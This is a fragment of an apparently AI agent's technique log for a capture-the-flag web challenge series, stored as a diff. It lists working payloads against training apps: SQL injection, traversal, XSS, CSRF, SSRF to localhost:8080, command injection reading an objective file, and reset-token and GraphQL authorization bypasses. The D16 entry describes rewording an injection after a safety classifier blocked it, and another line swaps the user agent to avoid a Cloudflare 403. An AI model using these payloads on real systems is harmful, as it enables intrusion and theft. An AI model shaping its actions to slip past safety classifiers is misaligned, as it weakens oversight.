Minimal API\" (D15). Rule: ignore it.","-- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /","-  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send","-  JSON first (form second), every candidate field in one body.","-- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>","-  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.","-- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`","-  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +","-  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.","-- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.","-- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both","-  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.","-- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from","-  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.","-- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),","-  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var","-  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate","-  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the","-  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).","-- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every","-  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder","-  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.","-- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body","-  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,","-  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,","-  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.","-- **API field/action authz (D14)**: inventory lists `query_parameters [id, fields, action]`, `fields` (single","-  `[title, note]`), `actions` (`[view, export]`), `public_reference`, `sample`; one (field, action) pair skips the","-  check on `protected_reference` (single: `note`+`export`; comma lists and `*` -> `field_action_forbidden`). TT and","-  Mastery (3 targets) passed with the same handler. Rule: param names, fields and actions from the inventory JSON,","-  try every SINGLE field x action on the protected id (sensitive-looking last entries first), then lists.","-- **SSRF internal port (D15)**: `GET feature?url=http://127.0.0.1:8080<secondary_route>` won in single, TT and","-  Mastery (4 targets); `127.0.0.1` / `localhost` on port 80, `:5000`, `:8000`, `:3000`, the public URL ->","-  `fetch_failed`. Param `url` (error text `absolute_url_required`). Rule: path = the 403 `internal_only` route, host","-  ladder `127.0.0.1:8080`, `localhost:8080`, then :80/:5000/:8000/:3000; param from the error word, else `url`.","-- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board","-  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.","+  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18, title only). Rule: ignore it -- except","+  that a Go server drops a raw `;` from the query string (percent-encode).","+- **Request body encoding (D12, D13)**: POST routes accept form AND JSON but only JSON binds. Rule: JSON first.","+- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`","+  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`","+  `\"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07","+  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`,","+  token sent or not. D10 preview URL from the upload response's `path`, syntax from the guide's `<code>`.","+- **SSTI (D11)**: param `template` (others rendered empty); `{{..}}` evaluated, `${..}`/`*{..}` literal under a","+  \"Spring Boot\" costume; context var `objective`. Rule: one probe per param holding every delimiter family with","+  distinct arithmetic, keep the family that evaluated, then ask for `objective`.","+- **Second-order SQLi (D12)**: `x' OR '1'='1' -- ` (single), `zz' OR 1=1 --` (TT) as JSON in every common field;","+  re-GET `secondary_route` after EACH plant. **Mass assignment (D13)**: one JSON body `display_name` + `role`,","+  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`; echo hides which bound.","+- **API field/action authz (D14)**: inventory `fields` `[title, note]`, `actions` `[view, export]`; single pair","+  (`note`+`export`) skips the check; lists and `*` forbidden. Rule: every SINGLE field x action from the inventory.","+- **SSRF (D15)**: `feature?url=http://127.0.0.1:8080<secondary>` in single, TT, Mastery; port 80/5000/8000/3000 =","+  `fetch_failed`. Rule: host ladder, port ladder, param from the error word, else `url`.","+- **Command injection (D16)**: `input_parameter: path` and `example_path: /app/static` constant across single, TT,","+  Mastery; base command `ls -ld <path>` (stdout echoed). Rule: param from `input_parameter` (else the `<x>_required`","+  error), value = example + `%3B` + `cat /run/huntress/objective.txt` (then `\\n`, `&&`, `|`, `$()`).","+- **Password reset (D17)**: guide JSON `{request_route, redeem_route, account_parameter: account_id,","+  token_parameter: token, accounts:[{id,label,self_service}]}` same keys in single/TT; ids, token (12 hex) and route","+  words differ. Rule: request a token for the `self_service:true` id, redeem it with each `self_service:false` id.","+- **GraphQL resolver (D18)**: schema identical in single/TT/Mastery (`caseIndex:[CaseReference{id,title,","+  visibility}]`, `case(id:ID!):Case{id,title,note}`); `protected_reference` is a STRING id. Rule: introspect, then","+  call every arg-taking Query field with the protected id selecting all scalars; POST JSON first, then GET","+  `?query=`, then form (\"vary the protocol surface\" -- POST JSON was enough every time).","+- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL","+  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on","+  field names or on `effect`."," "," ## Recognition cues -> first move"," - `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;","   Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.","-- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,","-  browser, POST, admin). No concept key -> the prompt's verb names the bug.","+- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the","+  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it."," - `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.","-  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.","-- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET","-  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored","-  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.","-- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.","-- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.","-- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an","-  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.","-- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary","-  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET","-  secondary -> `rows` holds the private row.","-- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature","-  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every","-  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.","-- \"take inventory ... every endpoint, every field, every function\", \"authorization is merely a suggestion\", clues","-  `inventory_route` + `protected_reference` -> D14: GET the inventory, then `feature?id=<protected>&fields=<f>&action=","-  <a>` over every single field x action; one pair returns `effect: api_field_action_authorization_bypassed`.","-- \"the server will fetch anything you point it at\", \"places you can't reach yourself\", \"internal service\", feature","-  400 `absolute_url_required`, secondary 403 `internal_only` -> D15 SSRF: `feature?url=http://127.0.0.1:8080<secondary>`","-  (port 80 = `fetch_failed`, try the port ladder before anything clever).","-- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).","+  `?doc=` + \"stay inside\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.","+- \"repeats everything\", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. \"guestbook\",","+  `moderator_data_route` -> D07 stored script for the bot; poll. \"plant your session\", `session_hint` -> D08 `?sid=`.","+- \"obeys whoever asks nicely -- even strangers\", hidden `csrf_token` -> D09 cross-site form submit. \"upload form has","+  standards. Low ones\", `upload_shape` -> D10 `.html` with `{{objective}}`. \"evaluates everything\", empty","+  \"Rendered message\" `<pre>` -> D11 `?template={{objective}}`. \"plant ... come back later\", `post_required` +","+  `{\"rows\":[]}` -> D12 JSON plant then GET secondary. \"binds whatever you hand it\", `administrator_required` -> D13","+  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.","+  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.","+- \"a little too close to a real shell\", \"give it something to do\", clues `input_parameter` + `example_path`, bare","+  feature 400 `path_required` -> D16: `curl -G \"$U<feature>\" --data-urlencode \"path=/app/static;cat","+  /run/huntress/objective.txt\"` -> `stdout` gains the proof (effect `worker_command_completed` shows on the baseline","+  too).","+- \"Forgot your password? ... wake up in somebody else's account\", clue `recovery_guide_route` -> D17: GET the guide,","+  `GET <request_route>?account_id=<self_service id>` -> `{\"token\":...}`, then `GET <redeem_route>?token=<it>&","+  account_id=<other id>` -> `effect: synthetic_account_recovery` + `evidence`.","+- \"Discover the schema\", \"resolver\", \"field-level control\", clues `protected_reference` + `note` (\"field access is","+  checked by each resolver\"), feature GET 404 `not_found` -> D18 GraphQL: POST JSON `{\"query\":\"{__schema{...}}\"}`,","+  then `{caseIndex{id title visibility} case(id:\"<protected>\"){id title note}}` -> `note` = proof.","+- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed)."," "," ## Day by day","-- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a","-  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain","-  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`","-  -> `effect: framework_authorization_bypassed`; 47 s.","-- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET","-  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,","-  `Origin`, `X-Callback-Nonce`; 83 s. D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data","-  route with credentials and POSTs `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s (Mastery receipt","-  >12 s). D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET","-  secondary; 116 s; Mastery ~15 min (every solver raced on every target starved the app).","-- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form; submit `?destination=review-NNNN%40","-  outside.example.invalid` with `Sec-Fetch-Site: cross-site`, `Mode: navigate`, `Dest: document`, foreign Referer ->","-  `/api/preferences` `changed_across_sites:true`; 70 s. D10 upload: POST JSON `{\"filename\":\"note.html\",\"content\":","-  \"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET the returned `path`; 58 s. Both TT `solver_incomplete`.","-- **D11-D13 (cal. 23)**: D11 SSTI (\"Spring Boot\"): one probe per param `a${7*7}b*{7*7}c{{7*7}}d` -> only `template`","-  rendered `{{..}}` -> `?template={{objective}}`; 105 s, plugin written pre-submit -> TT first try. D12 second-order","-  SQLi (\"Sinatra\"): POST JSON every field = `x' OR '1'='1' -- ` (form bodies ignored, `saved:true` either way) -> GET","-  secondary -> `rows[]` holds the proof; 83 s. D13 mass assignment (\"NestJS\"): POST JSON `display_name` + role/","-  is_admin/isAdmin/admin/roles/access_level/permissions -> `201` echo shows only `display_name` -> GET secondary ->","-  `bound_privileged_property`; 59 s. D12/D13 TT `solver_incomplete` (no handler yet), hand-solved.","-- **D14 The API Has Opinions (cal. 24)** -- broken function/property-level authz in an API (OWASP API3/API5). Clues","-  `{framework: \"Jakarta Servlet on Tomcat\", feature_route: /execute-<hex6>, inventory_route: /api/inventory,","-  current_role: analyst, protected_reference: <int>}`. Bare feature -> `{\"error\":\"id_fields_action_required\",","-  \"inventory_route\":...}`. Inventory -> `{\"resource\":\"cases\",\"route\":<feature>,\"method\":\"GET\",\"query_parameters\":","-  [\"id\",\"fields\",\"action\"],\"fields\":[\"title\",\"note\"],\"actions\":[\"view\",\"export\"],\"public_reference\":<int>,\"sample\":","-  {...}}`. Public id + title/view -> `{\"id\":..,\"title\":\"Ordinary workspace case\"}`; protected id -> 403","-  `field_action_forbidden` for title/view, title/export, note/view, `title,note`, `*`; `fields=note&action=export` ->","-  `{\"ok\":true,\"effect\":\"api_field_action_authorization_bypassed\",\"evidence\":\"proof_...\"}`. Tools: curl loop over","-  the 2x2 grid (`for f in ...; for a in ...; curl --max-time 20 \"$U<feature>?id=<prot>&fields=$f&action=$a\"`). Single","-  CORRECT 75 s; TT first try (solve 4.2 s), Mastery 3 targets (solve 3.4 s).","-- **D15 Fetch Quest (cal. 24)** -- SSRF. Clues `{framework: \"ASP.NET Core Minimal API\", feature_route: /action-<hex6>,","-  secondary_route: /account-<hex6> | /internal-<hex6>, current_role}` (no concept key). Bare feature -> 400","-  `absolute_url_required`; bare secondary -> 403 `internal_only`. `?url=http://127.0.0.1/<secondary>` and localhost ->","-  `fetch_failed`; `?url=http://127.0.0.1:8080/<secondary>` -> `{\"ok\":true,\"effect\":\"internal_service_reached\",","-  \"evidence\":\"proof_...\"}` (:5000/:8000/:3000, public URL, example.com all `fetch_failed`). Single CORRECT 75 s (3rd","-  request batch); TT `solver_incomplete` 41 s (plugin not yet on disk), live worker hit it with the same 4-URL loop;","-  Mastery 4 targets (first 4-target Mastery) solve 3.2 s. No `file://`, redirect or IP-encoding tricks needed.","+- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note`. D02 `/api/history` foreign","+  id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --`. D04 `reader.php?doc=../`*6+`run/huntress/","+  objective.txt`. D05 GET `/dispatch-<hex6>` -> `framework_authorization_bypassed`. 47-51 s each.","+- **D06-D08 (cal. 21)**: D06 reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET the callback with `Sec-Fetch-Site:","+  same-origin`/`Mode: cors`/`Dest: empty` + Referer; 83 s. D07 stored `<script>` fetches the data route and POSTs","+  `{evidence}` to the receipt route; poll (receipt >12 s in Mastery); 78 s. D08 `?sid=<hint>` -> `arena_session`","+  cookie -> GET secondary; 116 s (Mastery ~15 min: every solver raced on every target starved the app).","+- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: submit the outside mailbox with `Sec-Fetch-Site:","+  cross-site`, `Mode: navigate`, foreign Referer -> `changed_across_sites:true`; 70 s. D10 upload JSON `{filename:","+  \"note.html\", content:\"<p>{{objective}}</p>\", content_type:\"text/html\"}` -> GET returned `path`; 58 s.","+- **D11-D13 (cal. 23)**: D11 SSTI `?template={{objective}}` (105 s, plugin before submit -> TT first try). D12 JSON","+  plant `x' OR '1'='1' -- ` -> GET secondary `rows[]` (83 s). D13 JSON `display_name` + privilege keys -> GET","+  secondary `bound_privileged_property` (59 s).","+- **D14-D15 (cal. 24)**: D14 inventory -> `?id=<protected>&fields=note&action=export` ->","+  `api_field_action_authorization_bypassed` (75 s; TT/Mastery first try). D15 SSRF `?url=http://127.0.0.1:8080","+  <secondary>` -> `internal_service_reached` (75 s; TT `solver_incomplete`, plugin landed ~1 min late).","+- **D16 Shell Company (cal. 25)** -- OS command injection. Clues `{framework: \"Gin\", feature_route:","+  /process-<hex6> | /execute-<hex6>, input_parameter: \"path\", example_path: \"/app/static\", current_role}` (app","+  \"Command Counter\"). Bare -> 400 `{\"error\":\"path_required\",\"example_path\":\"/app/static\"}`; `?path=/app/static` ->","+  `{\"ok\":true,\"effect\":\"worker_command_completed\",\"stdout\":\"drwxr-xr-x ... /app/static\"}` (`ls -ld`). Raw","+  `?path=/app/static;id` -> `path_required` again (Go drops a query with a bare `;`); `%3B` works:","+  `?path=/app/static%3Bcat%20/run/huntress/objective.txt` -> stdout line 2 = proof. Single CORRECT ~40 s. TT","+  `solver_incomplete` (13.8 s, no plugin yet), live worker hand-solved in 31 s; Mastery 4 targets: 3 earlier","+  classes answered, today's missed (plugin file still `.tmp`), live worker solved it. A live turn that chained","+  `ls -la; cat /run/huntress/*` in a shell function was stopped by a safety classifier -- keep the injection to","+  one plain read of the objective file.","+- **D17 Reset Expectations (cal. 25)** -- password reset token not bound to the account it was issued for. Clues","+  `{framework: \"Symfony\", feature_route: /submit-<hex6>, secondary_route: /result-<hex6> | /audit-<hex6>,","+  recovery_guide_route: \"/api/recovery\", current_role}`. Guide -> `{request_route, redeem_route, account_parameter:","+  \"account_id\", token_parameter: \"token\", accounts:[{id, label:\"Your analyst account\", self_service:true}, {id,","+  label:\"Executive account\", self_service:false}]}`. Request for the victim -> `self_service_only`; request for self","+  -> `{\"ok\":true,\"account_id\":..,\"token\":\"<12 hex>\",\"redeem_route\":..}`; redeem `?token=<own>&account_id=<victim>`","+  -> `{\"ok\":true,\"effect\":\"synthetic_account_recovery\",\"account_id\":<victim>,\"evidence\":\"proof_...\"}`. Single","+  ~39 s; TT `solver_incomplete` (21 s) then hand-solved (52 s); Mastery 4 targets first try, 17 s total.","+- **D18 Resolver Revolt (cal. 25)** -- GraphQL resolver skipping its field-level check. Clues `{current_user:","+  \"analyst\", feature_route: /inspect-<hex6> | /submit-<hex6>, protected_reference: \"<int as string>\", note: \"The case","+  index lists references; field access is checked by each resolver.\"}`; page title \"Graph Garden · GraphQL.js\".","+  GET feature -> 404 `not_found` (do not conclude dead); POST JSON introspection works -> `Query{caseIndex, case(id:","+  ID!)}`, `Case{id,title,note}`, `CaseReference{id,title,visibility}` (protected row `visibility: \"reference","+  only\"`). `{caseIndex{id title visibility} case(id:\"<protected>\"){id title note}}` -> `note` = proof. Single","+  CORRECT ~36 s; TT `solver_incomplete` (22 s) then hand-solved (53 s); Mastery 4 targets first try, 14 s total."," "," ## GM answer conventions learned"," - Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.","-  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.","+  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`","+  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT)."," - `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),","-  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),","-  `bound_privileged_property` (D13, proof in `evidence`), `api_field_action_authorization_bypassed` (D14),","-  `internal_service_reached` (D15). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof","-  in rendered HTML; D07 in a moderator receipt.","+  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`","+  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),","+  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17); D18 none","+  (plain GraphQL `data`). D09 `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt."," - `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed."," "," ## Pitfalls that cost time","-- Shipping a new day without its class handler: D09, D10, D12, D13, D15 TT all `solver_incomplete`. Write the","-  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.","-- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.","+- Shipping a new day without its class handler: TT `solver_incomplete` on D09, D10, D12, D13, D15, D16, D17, D18,","+  and D16 Mastery missed today's target. Write `lib/web/handlers/dayNN_*.py` (KEY_MAP + HANDLERS) BEFORE the single","+  submit, like D11 did; the single solves now take ~40 s, so the plugin is the long pole.","+- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for","+  the plain `ls`. Success = proof regex.","+- Raw `;` in a Go (Gin) query string is dropped -> the param looks missing. Always `--data-urlencode` / `%3B`.","+- GraphQL routes 404 on GET; POST JSON `{\"query\":...}` before writing the route off."," - Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first."," - Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.","-- SSRF to the default port: D15's internal service listens on 8080; `http://127.0.0.1/<route>` = `fetch_failed`,","-  which reads like \"blocked\" but is just the wrong port. Port ladder first.","-- Combining fields (`title,note`, `*`) in D14 was forbidden; only the single bypassed pair works -- enumerate pairs.","-- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.","-- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13","-  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's","-  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.","-- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.","+- SSRF to the default port: D15's internal service listens on 8080; `fetch_failed` = wrong port, not \"blocked\".","+- Combining fields (`title,note`, `*`) in D14 was forbidden; only the single bypassed pair works.","+- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\".","+- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level","+  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel."," - Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later."," - Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.","-- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative.","+- Trusting the app's stated policy (\"txt only\", \"token required\", \"self-service only\" on REQUEST but not REDEEM)."," - `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403."," "," ## reviewer cross-check (measured on a parallel agent; folded into the drivers)"]}],"originalFile":"# web — technique log (lane-days D01-D15 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13, 24 D14-D15 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07\n  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).\n  Expect ~2-3 lane-days per calendar day (D16-D31 = 16 left for cal. 25-31). Each lane-day = ONE classic bug, named\n  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",\n  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06\n  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",\n  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12\n  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\", D14 per-field/action API authz (BFLA/\n  BOPLA) \"The API Has Opinions\", D15 SSRF \"Fetch Quest\". Arc: info-disclosure -> access control -> injection -> file\n  read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi -> mass assignment ->\n  API field/action authz -> SSRF (server-side / API turn since D10; D13-D14 = OWASP API Top 10 items; many days are\n  \"one level deeper\" sequels of earlier ones: D10->D11, D03->D12, D05->D13->D14).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET\n  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:\n  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,\n  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+\n  `upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`). D11-D13, D15 had NO concept key (D11 not even `secondary_route`): the prompt + the\n  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing\n  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,\n  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`\n  (403), `internal_only` (403), `absolute_url_required` (400), `fetch_failed`, `id_fields_action_required`,\n  `field_action_forbidden`). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the\n  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, **4 on D15**); the\n  prompt describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition\n  not logged: the solver answered all targets in 3-6 s). Mastery `preparing` varies: D12 189 s, D13 175 s, D11 7.5 s,\n  D14 17 s, D15 18 s; singles / TT 4-25 s.\n- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13, D15 TT all came back\n  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D15: TT started 13:18:04Z, the\n  `day24_web_fetch_quest.py` plugin landed ~1 min later -> live worker hand-solved. D11 (plugin written BEFORE the\n  single submit) and D14 went first try. The orchestrator starts TT ~5-30 s after single CORRECT.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;\n  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; render\n  (D10) `account` | `internal` | `result`; fixed paths `/preferences` (D09), `/api/inventory` (D14). Within one day:\n  D12 secondary `result` -> `internal`; D13 `audit` -> `internal`; D15 `account` -> `internal` (feature `action` both).\n  Rule: pick routes by clue KEY role (`feature_route`, `secondary_route`, `*_data_route`, `*_template`,\n  `inventory_route`), never by the word in the value.\n- **Clue key set**: with a concept key (D06-D10, D14) | only `feature_route`+`secondary_route` (D12, D13, D15) | only\n  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`\n  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink; 400\n  `absolute_url_required` on feature + 403 `internal_only` on secondary = SSRF pair).\n- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,\n  \"Jakarta Servlet on Tomcat\" (D14), \"ASP.NET Core Minimal API\" (D15). Rule: ignore it.\n- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /\n  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send\n  JSON first (form second), every candidate field in one body.\n- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>\n  